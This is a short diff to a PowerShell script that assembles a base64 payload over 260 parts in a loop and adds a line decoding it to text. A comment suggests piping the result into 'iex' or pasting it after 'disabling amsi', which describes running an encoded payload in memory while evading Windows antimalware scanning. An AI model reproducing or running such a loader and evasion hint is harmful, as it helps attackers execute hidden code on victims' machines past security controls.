@@ -1,4 +1,3 @@
-﻿
 $b64pv = ''
 :parts for ($i=1;$i -le 260;$i++) {
     while($true) {
@@ -14,3 +13,4 @@ $b64pv = ''
 }
 Echo "Done!"
 Echo $b64pv
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64pv)) # this could go into iex or copy pasted after disabling amsi for example
